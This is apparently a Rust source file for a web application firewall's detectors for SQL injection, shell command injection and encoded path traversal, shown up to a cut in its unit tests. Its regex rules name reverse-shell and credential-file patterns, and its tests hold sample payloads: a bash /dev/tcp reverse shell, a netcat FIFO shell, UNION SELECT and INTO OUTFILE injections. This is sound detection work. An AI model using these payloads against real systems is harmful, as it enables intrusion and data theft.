//! Lane 2 production semantic detectors (plan v2.2 §8).
//!
//! P1b shipped the first real detector, [`StructuralSqlDetector`]; **P1c adds two
//! more** — [`RceStructuralDetector`] (shell command injection) and
//! [`TraversalStructuralDetector`] (encoded / obfuscated path traversal). Each is
//! an `OpenRASP`-style **structural / regex half-semantic** detector, deliberately
//! *not* an AST parser (`sqlparser-rs` is P2). Each inspects the
//! normalised (`lower_trunc`) form of each preprocessor [`View`] and returns a
//! context-free [`DetectionFinding`]; the pipeline
//! ([`View::to_signal`](super::preprocess::View::to_signal)) attaches
//! provenance / field / scope / detector-id, so a detector can never forge the
//! provenance that gates hard-veto eligibility (codex A-1).
//!
//! **Shadow only in P1b**: the `SQLi` family ships with `enforcement_mode =
//! log_only`, so a match is at most logged + persisted, never a Block.

use regex::Regex;
use tracing::error;

use super::budget::ContentInspectionState;
use super::preprocess::{PreprocessCtx, SemanticDetector, View};
use super::types::{AttackKind, DetectionFinding, DetectorId};

/// How a compiled rule decides whether it fired.
enum RuleKind {
    /// Fires when the pattern matches at least once.
    Presence,
    /// Fires when the pattern matches at least this many times (density / frequency).
    Count(usize),
}

/// One compiled structural rule (shared by every structural detector — `SQLi`,
/// `RCE`, `Traversal`).
struct CompiledRule {
    /// Stable matching key (hard-veto allowlist matches on this, never `detail`).
    rule_key: &'static str,
    /// Graded confidence `0..=100` (shadow starting values, pre-holdout
    /// calibration — plan §6.6 / §8.2).
    confidence: u8,
    re: Regex,
    kind: RuleKind,
}

/// One row of a rule table: `(rule_key, confidence, pattern, kind, default_on)`.
///
/// `default_on = false` marks a rule that ships **disabled** by default: a
/// high-noise pattern that requires holdout calibration before it may run in
/// production (plan v2.2). [`compile_table`] compiles only the `default_on`
/// subset unless `all` is set (test-only).
type RuleRow = (&'static str, u8, &'static str, RuleKind, bool);

/// Compile a rule table, keeping either the default-on subset or every row.
///
/// A pattern that fails to compile (a bug — the patterns are constants) is
/// logged and skipped rather than panicking, so a detector degrades to a smaller
/// rule set instead of aborting startup (iron rule: no panic in production).
fn compile_table(table: &[RuleRow], all: bool, who: &str) -> Vec<CompiledRule> {
    let mut rules = Vec::with_capacity(table.len());
    for (rule_key, confidence, pattern, kind, default_on) in table {
        if !all && !*default_on {
            continue;
        }
        match Regex::new(pattern) {
            Ok(re) => rules.push(CompiledRule {
                rule_key,
                confidence: *confidence,
                re,
                kind: match kind {
                    RuleKind::Presence => RuleKind::Presence,
                    RuleKind::Count(n) => RuleKind::Count(*n),
                },
            }),
            Err(e) => error!("{who}: rule '{rule_key}' failed to compile: {e}"),
        }
    }
    rules
}

/// Return the strongest firing rule (highest confidence) over the haystack, or
/// `None` when nothing fired.
fn best_match<'a>(rules: &'a [CompiledRule], hay: &str) -> Option<&'a CompiledRule> {
    let mut best: Option<&CompiledRule> = None;
    for rule in rules {
        let fired = match rule.kind {
            RuleKind::Presence => rule.re.is_match(hay),
            RuleKind::Count(min) => rule.re.find_iter(hay).take(min).count() >= min,
        };
        if fired && best.is_none_or(|b| rule.confidence > b.confidence) {
            best = Some(rule);
        }
    }
    best
}

/// Build a de-identified [`DetectionFinding`] from the winning rule — it names
/// the rule and confidence, and **never** echoes the payload.
fn finding_for(rule: &CompiledRule, attack: AttackKind, family: &str) -> DetectionFinding {
    DetectionFinding {
        attack,
        confidence: rule.confidence,
        rule_key: rule.rule_key,
        detail: std::borrow::Cow::Owned(format!(
            "structural {family} rule '{}' matched (confidence {})",
            rule.rule_key, rule.confidence
        )),
    }
}

/// The rule table (plan §8.2). Patterns run against the **lowercased** normalised
/// view text, so every pattern is authored lowercase. Ordered high→low
/// confidence for readability; `detect` returns the strongest firing rule.
///
/// `(rule_key, confidence, pattern, kind, default_on)`.
///
/// `default_on = false` marks a rule that ships **disabled** by default (plan
/// v2.2: the high-noise stacked / chr / hex / `information_schema` rules require
/// holdout calibration before they may run). [`StructuralSqlDetector::new`]
/// compiles only the `default_on` rules; [`StructuralSqlDetector::with_all_rules`]
/// (test-only) compiles the whole table.
const RULES: &[RuleRow] = &[
    // Exfiltration / file write.
    (
        "sql.into_outfile",
        95,
        r"\binto\s+(outfile|dumpfile)\b",
        RuleKind::Presence,
        true,
    ),
    // Stacked query: a statement separator followed by another statement keyword.
    // DEFAULT-OFF (plan v2.2): fires on prose / code `; select …` with no SQL
    // context; needs holdout calibration before it may run.
    (
        "sql.stacked",
        90,
        r";\s*(select|insert|update|delete|drop|create|alter|union|declare|exec|grant)\b",
        RuleKind::Presence,
        false,
    ),
    // Dangerous functions / time-based blind primitives. The call-paren form
    // (`sleep(`, `benchmark(`, …) or `waitfor delay` is required.
    (
        "sql.dangerous_fn",
        85,
        r"\b(load_file|benchmark|sleep|pg_sleep|updatexml|extractvalue|xp_cmdshell)\s*\(|\bwaitfor\s+delay\b",
        RuleKind::Presence,
        true,
    ),
    // UNION-based with NULL / numeric / comma padding (column-count probing).
    // Requires adjacent `union [all|distinct] select` (SQL context), not just
    // `union … select` separated by arbitrary prose.
    (
        "sql.union_null",
        78,
        r"\bunion\b(?:\s+(?:all|distinct))?\s+select\b.{0,80}?(\bnull\b|,\s*null|,\s*,|\b\d+\s*,\s*\d+)",
        RuleKind::Presence,
        true,
    ),
    // General UNION SELECT — requires adjacent `union [all|distinct] select`.
    (
        "sql.union_select",
        72,
        r"\bunion\b(?:\s+(?:all|distinct))?\s+select\b",
        RuleKind::Presence,
        true,
    ),
    // MySQL version-gated comment `/*!12345 …*/` — requires a digit right after
    // `/*!` (a real version gate), so a plain `/*! license */` banner does not fire.
    ("sql.version_comment", 70, r"/\*!\d", RuleKind::Presence, true),
    // information_schema enumeration. DEFAULT-OFF (plan v2.2); also narrowed to
    // the structural `information_schema.tables|columns` form (a bare
    // `information_schema` field name no longer fires).
    (
        "sql.info_schema",
        65,
        r"\binformation_schema\s*\.\s*(tables|columns)\b",
        RuleKind::Presence,
        false,
    ),
    // chr()/char() obfuscation frequency ≥ 5. DEFAULT-OFF (plan v2.2): code /
    // formulas with repeated `char(` calls false-positive.
    ("sql.chr_freq", 45, r"\b(chr|char)\s*\(", RuleKind::Count(5), false),
    // Hex-literal density ≥ 2. DEFAULT-OFF (plan v2.2): log lines / on-chain data
    // with `0x…` constants false-positive. Token-bounded (`\b`).
    ("sql.hex_const", 40, r"\b0x[0-9a-f]+\b", RuleKind::Count(2), false),
];

/// `OpenRASP`-derived structural `SQLi` detector (plan §8). Registered in the
/// `SQLi` attack family; matches on the normalised view text.
pub struct StructuralSqlDetector {
    rules: Vec<CompiledRule>,
}

impl StructuralSqlDetector {
    /// Compile the **default-on** rules. A pattern that fails to compile (a bug —
    /// the patterns are constants) is logged and skipped rather than panicking, so
    /// the detector degrades to a smaller rule set instead of aborting startup
    /// (iron rule: no panic in production).
    ///
    /// The high-noise stacked / chr / hex / `information_schema` rules are
    /// `default_on = false` (plan v2.2) and are **not** compiled here; they await
    /// holdout calibration before they may run in production.
    #[must_use]
    pub fn new() -> Self {
        Self::compile(false)
    }

    /// Test-only constructor that compiles **every** rule in the table, including
    /// the default-off high-noise rules, so unit tests can exercise them.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self::compile(true)
    }

    /// Compile the rule table, keeping either the default-on subset or all rules.
    #[must_use]
    fn compile(all: bool) -> Self {
        Self {
            rules: compile_table(RULES, all, "StructuralSqlDetector"),
        }
    }
}

impl Default for StructuralSqlDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for StructuralSqlDetector {
    fn id(&self) -> DetectorId {
        DetectorId::StructRule
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::SqlInjection, "SQLi"))
    }
}

// ── RCE (shell command injection) structural detector (plan §8, P1c) ──────────

/// Self-authored shell command-injection rule table (plan §8.3). Patterns run
/// against the **lowercased** normalised view text (authored lowercase). The
/// legacy Lane 1 [`crate::checks::RceCheck`] veto stays frozen and runs first;
/// this additive detector fires on the Lane-2-only decode/normalise views
/// (base64 / hex / html-entity / SQL-comment strip / **shell de-obfuscation**)
/// that Lane 1's raw URL-decode-only path cannot see (fire-drill 2026-07-22).
///
/// Every rule is **context-narrowed** to defeat the classic false positives:
/// a bare `|` / `&` / `sh` / `nc` / `$(` never fires on its own — a command
/// separator must be followed by a real dangerous binary, a command
/// substitution must wrap a real command, `sh`/`bash` require the `-c`/`-i`/`-e`
/// exec form (codex P1b §3.2 discipline).
///
/// `default_on = false` marks the high-noise rules (a bare separator + common
/// command, backtick-wraps-anything) that await holdout calibration.
const RCE_RULES: &[RuleRow] = &[
    // Reverse-shell fingerprints: `/dev/tcp` redirect, `bash -i`, `nc -e/-c`.
    // These are complete reverse-shell structures with very low FP. A bare
    // `mkfifo` is DELIBERATELY NOT here (codex A-4): `mkfifo` is an ordinary POSIX
    // utility that appears in docs / ops tooling, so it must not single-handedly
    // reach confidence 92 — the FIFO reverse-shell form is caught by the
    // default-off `rce.mkfifo_revshell` joint rule below (FIFO + shell/nc).
    (
        "rce.reverse_shell",
        92,
        r"/dev/(tcp|udp)/|\b(ba)?sh\s+-i\b|\bn(c|cat)\s+-[ec]\b|>&\s*/dev/(tcp|udp)",
        RuleKind::Presence,
        true,
    ),
    // Interpreter exec flag: `sh -c` / `bash -c` / `python -c` / `perl -e` /
    // `powershell -enc` — the inline-code-execution idiom.
    (
        "rce.shell_exec_flag",
        82,
        r"\b(sh|bash|zsh|dash|python[0-9.]*|perl|ruby|php|powershell|pwsh)\s+-(c|e|enc|encodedcommand)\b",
        RuleKind::Presence,
        true,
    ),
    // Command substitution wrapping a real command: `$(id)`, `$(cat /etc/passwd)`.
    // Narrowed to the `$(` form ONLY (codex A-4): jQuery `$('#x')` / `$(document)`
    // do not fire (the char after `$(` must lead into a known command, not a
    // quote), and the backtick form — which false-positives on Markdown command
    // spans like `` `curl --help` `` — moved to the default-off `rce.backtick_cmd`.
    (
        "rce.cmd_subst",
        80,
        r"\$\(\s*/?(?:usr/)?(?:bin/)?(id|whoami|uname|cat|ls|wget|curl|nc|ncat|bash|sh|pwd|hostname|ifconfig|env|printenv|nslookup|dig|sleep|ping)\b",
        RuleKind::Presence,
        true,
    ),
    // Pipe into an interpreter: `... | sh`, `curl x | bash`.
    (
        "rce.piped_shell",
        78,
        r"\|\s*(sh|bash|zsh|dash|python[0-9.]*|perl)(\s|$)",
        RuleKind::Presence,
        true,
    ),
    // Separator (`;` `|` `&&` `$(`) followed by a fetch tool WITH an argument:
    // `; wget http://…`, `| curl -o …`. A SINGLE `&` is NOT a separator here
    // (codex A-4): in a query/form/prose `&` is the field separator, so `&curl
    // help` must stay clean; only `&&` counts. A backtick is likewise excluded —
    // a Markdown span `` `curl --help` `` must not fire (the backtick fetch form is
    // covered by the default-off `rce.backtick_cmd`). The trailing `\S` requires a
    // real argument, so `&method=curl&x=1` and a bare `curl` word both stay clean.
    (
        "rce.fetch_exec",
        75,
        r"(?:[;|]|&&|\$\()\s*(wget|curl|certutil|nslookup|tftp)\s+\S",
        RuleKind::Presence,
        true,
    ),
    // Reading a sensitive file via a reader command — the shape a de-obfuscated
    // `cat$IFS/etc/passwd` collapses to after shell normalisation.
    (
        "rce.sensitive_read",
        70,
        r"\b(cat|less|more|head|tail|nl|od|xxd|strings)\s+/?(etc/passwd|etc/shadow|proc/self|proc/version)",
        RuleKind::Presence,
        true,
    ),
    // DEFAULT-OFF (codex A-4, joint structure): a FIFO reverse shell — `mkfifo`
    // followed (within a short window) by a shell / netcat reader, e.g.
    // `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i … | nc …`. Requiring the joint
    // structure keeps a bare `mkfifo` doc/word from firing; ships disabled pending
    // holdout calibration.
    (
        "rce.mkfifo_revshell",
        90,
        r"\bmkfifo\b.{0,60}\b(nc|ncat|sh|bash)\b",
        RuleKind::Presence,
        false,
    ),
    // DEFAULT-OFF (high-noise): a bare separator + a common command. `; ls`,
    // `| cat`, `&& echo` occur in prose / shell snippets / params, so this
    // awaits holdout calibration before running.
    (
        "rce.cmd_sep_common",
        45,
        r"[;|&]\s*(cat|ls|id|rm|cp|mv|chmod|chown|echo|ping|kill|ps|whoami|uname|pwd|dir|type)\b",
        RuleKind::Presence,
        false,
    ),
    // DEFAULT-OFF (codex A-4, high-noise): a backtick wrapping a known command —
    // Markdown command spans (`` `curl --help` ``) false-positive heavily, so the
    // backtick command-substitution form ships disabled pending holdout data. The
    // `$(cmd)` form stays default-on above.
    (
        "rce.backtick_cmd",
        78,
        r"`\s*/?(?:usr/)?(?:bin/)?(id|whoami|uname|cat|ls|wget|curl|nc|ncat|bash|sh|pwd|hostname|ifconfig|env|printenv|nslookup|dig)\b",
        RuleKind::Presence,
        false,
    ),
];

/// Self-authored structural RCE / command-injection detector (plan §8, P1c).
/// Registered in the `RCE` attack family; matches on the normalised view text.
pub struct RceStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl RceStructuralDetector {
    /// Compile the **default-on** rules (the high-noise `cmd_sep_common` /
    /// `backtick_any` rules await holdout calibration and are not compiled).
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(RCE_RULES, false, "RceStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(RCE_RULES, true, "RceStructuralDetector"),
        }
    }
}

impl Default for RceStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for RceStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::Rce
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Rce, "RCE"))
    }
}

// ── Traversal T1 (encoded path traversal) structural detector (plan §8, P1c) ──

/// Encoded / obfuscated path-traversal rule table (plan §8.4, "T1"). **T0** is
/// the frozen Lane 1 [`crate::checks::DirTraversalCheck`] veto (raw `../`,
/// `%2e%2e`, overlong, sensitive absolute paths on the URL-decode-only path);
/// it is unchanged and runs first. This additive **T1** detector re-catches the
/// same structures on the Lane-2-only decode views (base64 / hex / html-entity /
/// shell-normalised) — a traversal wrapped in base64, or split by quotes so the
/// `/etc/passwd` literal never appears raw, is invisible to Lane 1 but surfaces
/// here after the semantic preprocessor decodes it.
///
/// The plain-`../` rule is **default-off**: relative paths / JS imports
/// (`import x from '../util'`) make a bare `../` far too noisy to run by default
/// (P1b FP discipline). The encoded / overlong / sensitive-absolute rules are
/// default-on: those forms are almost never legitimate.
const TRAVERSAL_RULES: &[RuleRow] = &[
    // Overlong / invalid-UTF-8 encodings of `../` — always malicious.
    (
        "traversal.overlong",
        82,
        r"\.\.(%c0%af|%c1%9c|%e0%80%af)|%c0%ae%c0%ae|%c0%2e%c0%2e",
        RuleKind::Presence,
        true,
    ),
    // Percent-encoded dot-dot: `%2e%2e/`, `..%2f`, `..%5c`, double-encoded
    // `%252e%252e/`. Every alternative requires a following path separator (codex
    // A-4 must-fix): a bare `%252e%252e` (or `%2e%2e`) is only an encoded `..`
    // (as in a filename `photo%252e%252ejpg`, or a triple encoded dot
    // `%252e%252e%252e` with no separator at all) and is NOT traversal on its
    // own. A further encoded *dot* (`%2e` / `%252e`) is NOT a separator and is
    // deliberately excluded from the following-character set (the earlier
    // must-fix bug: it let an unbounded run of encoded dots fire without ever
    // requiring a `/` or `\`).
    //   * single-encoded `%2e%2e` must be followed by a REAL separator: raw
    //     `/`/`\` or single-encoded `%2f`/`%5c`;
    //   * double-encoded `%252e%252e` must be followed by either the fully
    //     double-encoded separator `%252f`/`%255c`, or a mixed-depth single
    //     separator (`%2f`/`%5c`/`/`/`\`) — mixed-encoding-depth traversal is a
    //     real bypass vector seen in the wild and is intentionally kept.
    // Encoded traversal with a genuine separator is essentially never
    // legitimate traffic.
    (
        "traversal.encoded_dotdot",
        75,
        r"%2e%2e(%2f|%5c|/|\\)|%252e%252e(%252f|%255c|%2f|%5c|/|\\)|\.\.%2f|\.\.%5c|%2e%2e%2f",
        RuleKind::Presence,
        true,
    ),
    // Sensitive absolute path revealed after decoding (base64/hex/normalise).
    // Kept to a TIGHT, unambiguous list (codex A-4) — only paths that are almost
    // never legitimate to request: `/etc/passwd`, `/etc/shadow`, SSH keys, Windows
    // system32 / win.ini / boot.ini. High-frequency legitimate ops/container paths
    // (`/etc/hosts`, `/proc/self`, `/proc/version`) are NOT here — they moved to
    // the default-off `traversal.sensitive_abs_ops` rule so ordinary ops traffic
    // does not trip a shadow event.
    (
        "traversal.sensitive_abs",
        68,
        r"/etc/(passwd|shadow)\b|/root/\.ssh/|(/|\\)windows(/|\\)(system32|win\.ini)|\bboot\.ini\b",
        RuleKind::Presence,
        true,
    ),
    // DEFAULT-OFF (codex A-4): high-frequency legitimate absolute paths that are
    // only weak traversal evidence on their own — `/etc/hosts`, `/proc/self`,
    // `/proc/<pid>/`. A reader command in front of them still fires the default-on
    // `rce.sensitive_read` rule; this bare-path form awaits holdout calibration.
    (
        "traversal.sensitive_abs_ops",
        55,
        r"/etc/hosts\b|/proc/self\b|/proc/version\b|/proc/[0-9]+/",
        RuleKind::Presence,
        false,
    ),
    // DEFAULT-OFF (high-noise): a plain decoded `../` / `..\`. Also catches the
    // `....//` double-write bypass (it contains `../` as a substring). Relative
    // imports / paths make this too noisy to run before holdout calibration.
    ("traversal.plain_dotdot", 50, r"\.\.[/\\]", RuleKind::Presence, false),
];

/// Encoded path-traversal (T1) structural detector (plan §8, P1c). Registered in
/// the `Traversal` attack family; matches on the normalised view text.
pub struct TraversalStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl TraversalStructuralDetector {
    /// Compile the **default-on** rules (the noisy plain-`../` rule awaits
    /// holdout calibration and is not compiled).
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(TRAVERSAL_RULES, false, "TraversalStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off plain-`../`.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(TRAVERSAL_RULES, true, "TraversalStructuralDetector"),
        }
    }
}

impl Default for TraversalStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for TraversalStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::Traversal
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Traversal, "Traversal"))
    }
}

/// The **default-on** RCE + Traversal rule patterns — the single source of truth
/// the Lane 2 preprocessor gates share (codex A-3).
///
/// A synthetic view (shell-normalise / blind base64 / blind hex) is only worth
/// emitting when a *default-on* detector could actually fire on its result. Rather
/// than maintain a second, drift-prone copy of the "strong structure" list in the
/// preprocessor, both the shell-emission gate ([`super::preprocess::shell_normalize`])
/// and the blind base64/hex gate ([`super::preprocess`] `looks_structural`) build
/// their RCE/Traversal marker from exactly these patterns. Removing a rule, adding
/// one, or toggling `default_on` here therefore updates the gates in lock-step —
/// the gate can never accept a structure the default-on detector would reject, nor
/// reject one it would accept.
pub(crate) fn default_on_rce_traversal_patterns() -> impl Iterator<Item = &'static str> {
    RCE_RULES
        .iter()
        .chain(TRAVERSAL_RULES.iter())
        .filter(|(_, _, _, _, default_on)| *default_on)
        .map(|(_, _, pattern, _, _)| *pattern)
}

#[cfg(test)]
mod tests {
    use std::borrow::Cow;
    use std::collections::HashMap;
    use std::sync::Arc;

    use bytes::Bytes;
    use waf_common::{HostConfig, RequestCtx};

    use super::*;
    use crate::checks::content_security::budget::ContentInspectionState;
    use crate::checks::content_security::types::{InspectionScope, Provenance};

    fn view(text: &str) -> View<'static> {
        // Mirror the preprocessor's normalisation so tests exercise the real
        // matching surface (lowercase, whitespace-collapsed).
        let lower_trunc: String = text
            .to_ascii_lowercase()
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
        View {
            location: Cow::Borrowed("query"),
            round: 0,
            text: Cow::Owned(text.to_string()),
            lower_trunc,
            provenance: Provenance::Raw,
        }
    }

    fn throwaway_req() -> RequestCtx {
        RequestCtx {
            req_id: "t".to_string(),
            client_ip: "127.0.0.1".parse().expect("ip"),
            client_port: 0,
            method: "GET".to_string(),
            host: "example.com".to_string(),
            port: 80,
            path: "/".to_string(),
            query: String::new(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length: 0,
            is_tls: false,
            host_config: Arc::new(HostConfig::default()),
            geo: None,
        }
    }

    fn fire(text: &str) -> Option<DetectionFinding> {
        let det = StructuralSqlDetector::new();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        det.detect(&view(text), &pctx, &mut st)
    }

    /// Fire against the FULL rule set (including default-off rules).
    fn fire_all(text: &str) -> Option<DetectionFinding> {
        let det = StructuralSqlDetector::with_all_rules();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        det.detect(&view(text), &pctx, &mut st)
    }

    #[test]
    fn all_rules_compile() {
        // Every pattern in the table must compile (default-on and default-off).
        let det = StructuralSqlDetector::with_all_rules();
        assert_eq!(det.rules.len(), RULES.len(), "every rule pattern must compile");
    }

    #[test]
    fn default_on_excludes_high_noise_rules() {
        // plan v2.2: stacked / chr / hex / info_schema ship disabled by default.
        let det = StructuralSqlDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["sql.stacked", "sql.chr_freq", "sql.hex_const", "sql.info_schema"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "sql.into_outfile",
            "sql.dangerous_fn",
            "sql.union_null",
            "sql.union_select",
            "sql.version_comment",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn union_select_fires() {
        let f = fire("1 union select username,password from users").expect("union select must fire");
        assert!(matches!(f.rule_key, "sql.union_null" | "sql.union_select"));
        assert_eq!(f.attack, AttackKind::SqlInjection);
    }

    #[test]
    fn union_all_select_fires() {
        // `union all select` / `union distinct select` are still SQL context.
        assert!(fire("1 union all select 1,2").is_some());
        assert!(fire("1 union distinct select 1,2").is_some());
    }

    #[test]
    fn stacked_query_fires_when_enabled() {
        // Default-off, but must fire when the full rule set is compiled.
        let f = fire_all("1; drop table users").expect("stacked query must fire with all rules");
        assert_eq!(f.rule_key, "sql.stacked");
        // …and must NOT fire on the default-on rule set.
        assert!(fire("1; drop table users").is_none(), "stacked is default-off");
    }

    #[test]
    fn into_outfile_is_strongest() {
        // outfile (95) beats a co-occurring union (≤78) → hard-veto candidate wins.
        let f = fire("1 union select 1 into outfile '/tmp/x'").expect("outfile must fire");
        assert_eq!(f.rule_key, "sql.into_outfile", "strongest rule wins");
        assert_eq!(f.confidence, 95);
    }

    #[test]
    fn dangerous_fn_fires() {
        assert_eq!(
            fire("1 and sleep(5)").expect("sleep must fire").rule_key,
            "sql.dangerous_fn"
        );
        assert_eq!(
            fire("1 and extractvalue(1,concat(0x7e,version()))")
                .expect("extractvalue must fire")
                .rule_key,
            "sql.dangerous_fn"
        );
    }

    #[test]
    fn version_comment_fires() {
        // A bare version comment (no union/select) fires exactly the version rule.
        assert_eq!(
            fire("/*!12345 x */").expect("bare version comment fires").rule_key,
            "sql.version_comment"
        );
    }

    #[test]
    fn clean_traffic_does_not_fire() {
        // Prose, JSON and ordinary queries must not trip any rule.
        assert!(fire("the quick brown fox jumps over the lazy dog").is_none());
        assert!(fire(r#"{"name":"alice","role":"admin","age":30}"#).is_none());
        assert!(fire("q=laptop&sort=price&order=asc&page=2").is_none());
        assert!(
            fire("SELECTED_ITEMS=3&reunion=family").is_none(),
            "word-boundary guards"
        );
        assert!(fire("please sleep well tonight").is_none(), "sleep without call parens");
    }

    /// codex §3.2 false-positive corpus: every one of these benign inputs must
    /// stay below the default log threshold (i.e. produce no finding) on the
    /// DEFAULT-ON rule set. This is the calibration evidence for shadow-on.
    #[test]
    fn clean_traffic_codex_negatives_do_not_fire() {
        // union/select in prose or as unrelated params — no adjacency, no fire.
        assert!(
            fire("the union will select a representative for the committee").is_none(),
            "prose 'union … select' must not fire"
        );
        assert!(
            fire("operation=union&action=select&scope=all").is_none(),
            "unrelated union/select params must not fire"
        );
        // A plain licence banner comment — no version digit → version_comment off.
        assert!(
            fire("/*! license: MIT, see LICENSE for details */").is_none(),
            "non-version /*! banner must not fire"
        );
        // Bare information_schema field name (no `.tables`) — and rule is default-off.
        assert!(
            fire("column=information_schema&sort=asc").is_none(),
            "bare information_schema must not fire"
        );
        // Even with the full rule set, a bare information_schema without the
        // structural `.tables|.columns` form stays clean.
        assert!(
            fire_all("column=information_schema&sort=asc").is_none(),
            "bare information_schema is not structural"
        );
        // Repeated char( in code / a formula — chr_freq is default-off.
        assert!(
            fire("char(65)+char(66)+char(67)+char(68)+char(69)").is_none(),
            "code char( repetition must not fire (chr_freq default-off)"
        );
        // Hex constants in a log line — hex_const is default-off.
        assert!(
            fire("addr=0xdeadbeef nonce=0xcafebabe block=0x1f").is_none(),
            "log 0x constants must not fire (hex_const default-off)"
        );
        // benchmark / sleep mentioned as words (no call parens) — no fire.
        assert!(
            fire("see the benchmark results and sleep schedule").is_none(),
            "benchmark/sleep as words (no parens) must not fire"
        );
    }

    #[test]
    fn info_schema_structural_form_fires_when_enabled() {
        // The narrowed structural `information_schema.tables|columns` form still
        // fires under the full rule set, in isolation from the union rules.
        assert_eq!(
            fire_all("select table_name from information_schema.tables")
                .expect("structural info_schema.tables fires")
                .rule_key,
            "sql.info_schema"
        );
        assert_eq!(
            fire_all("select 1 from information_schema.columns where 1=1")
                .expect("info_schema.columns fires")
                .rule_key,
            "sql.info_schema"
        );
    }

    // ── RCE detector ─────────────────────────────────────────────────────────

    fn run(det: &dyn SemanticDetector, text: &str) -> Option<DetectionFinding> {
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        det.detect(&view(text), &pctx, &mut st)
    }

    fn rce_fire(text: &str) -> Option<DetectionFinding> {
        run(&RceStructuralDetector::new(), text)
    }

    fn rce_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&RceStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn rce_all_rules_compile() {
        let det = RceStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), RCE_RULES.len(), "every RCE pattern must compile");
    }

    #[test]
    fn rce_default_on_excludes_high_noise_rules() {
        let det = RceStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["rce.cmd_sep_common", "rce.backtick_cmd", "rce.mkfifo_revshell"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "rce.reverse_shell",
            "rce.shell_exec_flag",
            "rce.cmd_subst",
            "rce.piped_shell",
            "rce.fetch_exec",
            "rce.sensitive_read",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn rce_reverse_shell_fires() {
        let f = rce_fire("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").expect("reverse shell fires");
        assert_eq!(f.rule_key, "rce.reverse_shell");
        assert_eq!(f.attack, AttackKind::Rce);
        assert_eq!(f.confidence, 92);
        // A FIFO reverse shell still fires via its `nc -e` component…
        assert!(rce_fire("mkfifo /tmp/f; nc -e /bin/sh 1.2.3.4 9001").is_some());
    }

    #[test]
    fn rce_bare_mkfifo_is_not_a_default_on_block() {
        // codex A-4: a bare `mkfifo` word (docs / ops tooling) must NOT reach
        // confidence 92 on the default-on set — it was removed from
        // `rce.reverse_shell`, and the joint form is default-off.
        assert!(
            rce_fire("mkfifo is a posix utility for creating named pipes").is_none(),
            "bare mkfifo doc must not fire a default-on RCE rule"
        );
        assert!(rce_fire("run mkfifo /tmp/myqueue to create the fifo").is_none());
        // A mkfifo + shell joint structure fires ONLY under the full (default-off)
        // rule set as `rce.mkfifo_revshell`; the default set stays quiet.
        let joint = "mkfifo /tmp/f then read the fifo with sh";
        assert!(rce_fire(joint).is_none(), "mkfifo_revshell is default-off");
        assert_eq!(
            rce_fire_all(joint)
                .expect("joint fifo revshell fires with all rules")
                .rule_key,
            "rce.mkfifo_revshell"
        );
    }

    #[test]
    fn rce_cmd_subst_fires_but_jquery_and_backtick_do_not() {
        assert_eq!(
            rce_fire("q=$(whoami)").expect("cmd subst fires").rule_key,
            "rce.cmd_subst"
        );
        // codex A-4: the backtick command-substitution form is now DEFAULT-OFF, so
        // a Markdown command span does not fire on the production set. (`whoami`
        // isolates the backtick rule — it is not matched by any other rule, unlike
        // `cat /etc/passwd`, which the sensitive-read rule catches independently.)
        assert!(
            rce_fire("`whoami`").is_none(),
            "backtick command subst is default-off in production"
        );
        assert!(
            rce_fire("see `curl --help` for the full option list").is_none(),
            "a Markdown command span must not fire on the default-on set"
        );
        // …but the backtick form still fires under the full rule set.
        assert_eq!(
            rce_fire_all("`whoami`")
                .expect("backtick subst fires with all rules")
                .rule_key,
            "rce.backtick_cmd"
        );
        // jQuery / templating must NOT trip cmd_subst (even with all rules).
        assert!(rce_fire_all("$(document).ready(function(){})").is_none());
